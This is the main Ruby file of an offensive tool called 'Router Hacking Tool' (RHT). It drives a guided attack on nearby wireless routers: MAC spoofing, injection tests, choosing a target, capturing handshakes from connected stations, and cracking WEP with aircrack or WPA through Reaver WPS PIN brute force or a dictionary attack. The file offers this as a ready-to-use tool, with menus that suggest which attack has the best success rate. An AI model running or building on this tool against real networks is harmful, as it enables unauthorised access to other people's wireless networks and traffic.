require './stop_n_clean.rb'
require './airmon_parser.rb'
require './monitoring_starter.rb'
require './macchanger.rb'
require './inj_support.rb'
require './injection_test_parser.rb'
require './wash_parser.rb'
require './airodump_parser.rb'
require './router_init.rb'
require './airodump_focus.rb'
require './airodump_focused_parser.rb'
require './station_init.rb'
require './wpa_handler.rb'
require './reaver_runner.rb'
require './wep_handler.rb'
#Main file

system("clear")
puts "RHT v1.3.1;" 
puts "Welcome to Router Hacking Tool!"
puts 
puts "Please make sure that your wireless is enabled!"
puts "Press Enter to continue..."
gets.chomp

if system("cls")
	abort("RHT can run only on Linux BackTrack or Kali. Sorry, mate.")
end

stop_n_clean()
# Stops all mons and wlans, ensuring mon0 will be free and
# deletes trash files, that were left from previous runs

interface = macchanger(monitoring_starter(airmon_parser, 1))
# Offers the user to temporary change his MAC address

router = Router.new
no_stations = false

system("clear")
puts "RHT is checking if your wireless card supports injection..."
puts

if supports_injection?
	puts
	puts "Your card supports injection! Yay! ^.^"
	
	begin
		begin
			
			if no_stations
				puts "Error: No stations found"
				puts "Note: In order for the attack to work someone has to be using the router."
				cleaner()
				puts "Press Enter to continue..."
				gets.chomp
				system("clear")
			end
			
			puts "You can now start a 'Probe Request' test which will help later"
			puts "by telling you which routers are not a good attack target."
			puts "This can be determined by their responce to this test."
			puts "\nNote: Have in mind that this test takes a couple of minutes."
			puts "The more routers are visible, the longer it will take to finish."
	
			puts "\nDo you want to run the test? (y/n)"
			input = gets.chomp
			if input == 'y' || input == 'Y'
	
				puts "RHT will now send probe requests to all visible APs and"
				puts "will bring up a list for you to chose which router to attack."
				puts "\nNote: Better go take a drink. ^w^"
				puts "\nPress Enter to continue..."
				gets.chomp
	
				ap_probes = injection_test_parser(interface)
			end
			
			system("clear")
			puts "\nRHT will now scan all visible APs to see "
			puts "which of them are Reaver-crackable."
			puts
			puts "Press Enter to continue..."
			gets.chomp
			
			wash_list = wash_parser
			airodump_parser()
	
			router = airodump_focus(router_init(wash_list, ap_probes))
			# Focuses airodump on the chosen router; 
			# Returns the focused router as a Router object
			 
			airodump_focused_parser()
			router = station_init(router)
			no_stations = false
			
			if router.stations[0].nil?
				no_stations = true
			end
		
		end while no_stations && !(router.privacy =~ /WPA/ && router.wps == "Yes")
		 
		if router.privacy =~ /WEP/
			wep_handler(router)
			# Runs aireplay on one of the selected router's stations
			# and aircrack on the .cap file
		else
			if router.wps == "Yes"
				system("clear")
				puts "The selected router can be cracked in two ways:"
				puts " - using Reaver"
				puts " - using dictionary"
				puts "We suggest using the Reaver. It will start checking"
				puts "all WPS PINs until it finds the selected router's. "
				puts "It has a high success rate. Reaver will also save it's "
				puts "progress for the current router when interrupted"
				puts "so you can stop it when you want and start it "
				puts "again later (on the same router). Reaver attack"
				puts "takes a couple of hours (depends on the connection)."
				puts
				puts "Using a dictionary would mean to make a user of"
				puts "the router to log in again. RHT will then use"
				puts "aircrack-ng to compare every password in the" 
				puts "dictionary with the reauthentication packet."
				puts "The progress will NOT be saved so it's better"
				puts "not to use this attack if you can't wait for it"
				puts "to finish. The dictionary attack has low success"
				puts "rate. It will take plenty of time. Three to "
				puts "twelve hours, probably."
				puts
				puts "Which attack to use: "
				puts "---------------------------------------"
				puts "1) Use Reaver"
				puts "2) Use Dictionary"
				puts "---------------------------------------"
				puts "Example: 1"
				puts "\nNote: You can type 'exit' if you want to "
				puts "exit RHT. Reaver saves its progress for the "
				puts "current router."
				puts
				printf "\n-> "
				input = gets.chomp
				case input
					when "1"
						reaver_runner(router)
					when "2"
						wpa_handler(router)
						# Runs aireplay on one of the selected router's stations
						# and aircrack on the .ivs file using OUR dictionary
					when "exit"
						break
				end
			else
				wpa_handler(router)
			end
		end
		# End of Reaver-crackable If
		
		system("clear")
		puts "Do you want to go back to router selection? (y/n)"
		input = gets.chomp
		system("clear")
		
	end while input == 'y' || input == 'Y'
	# End of 'Back to Router Select' Loop
else 
	puts
	puts "Press Enter to continue..."
	gets.chomp
end

stop_n_clean(1,1)
puts "\nThank you for using RHT!"
puts "Bye bye :)"

